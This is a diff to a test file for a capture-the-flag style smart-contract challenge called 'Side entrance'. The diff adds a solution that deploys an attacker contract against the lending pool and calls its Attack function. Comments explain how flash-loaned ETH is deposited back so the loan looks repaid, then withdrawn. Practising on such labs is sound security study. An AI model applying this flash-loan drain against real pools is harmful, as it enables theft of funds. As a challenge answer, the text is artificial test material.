@@ -24,9 +24,12 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // contract in attacker-contracts
         const SideEntranceAttackerFactory = await ethers.getContractFactory('SideAttack', attacker);
+        // deposit the eth back to the contract, shows that eth has been paid back
+        // also shows that attacker address has that amount allocated
         const attackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address);
+        // and the attacker contract withdraws the ETH that was allocated
         await attackerContract.Attack();
 
     });
